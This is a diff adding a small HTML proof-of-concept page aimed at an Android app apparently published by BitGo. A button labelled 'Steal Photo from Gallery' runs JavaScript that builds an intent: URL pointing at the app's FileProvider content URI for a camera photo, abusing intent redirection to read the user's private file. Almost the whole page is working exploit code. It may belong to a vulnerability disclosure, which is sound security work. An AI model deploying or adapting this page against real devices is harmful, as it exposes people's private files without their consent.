@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BitGo FileProvider Remote Read PoC</title>
+</head>
+<body>
+    <h1>BitGo FileProvider Remote File Read PoC</h1>
+    <p>Click the button below to trigger BitGo to read your gallery photo via Intent Redirection.</p>
+    <button onclick="triggerIntent()" style="font-size:18px;padding:15px 30px;">Steal Photo from Gallery</button>
+
+    <script>
+        function triggerIntent() {
+            const uri = "content://com.bitgo.verify.fileprovider/shared/DCIM/Camera/IMG_20251130_084156.jpg";
+            const intentUrl = `intent:#Intent;action=android.intent.action.VIEW;data=${encodeURIComponent(uri)};end`;
+            window.location.href = intentUrl;
+        }
+    </script>
+</body>
+</html>
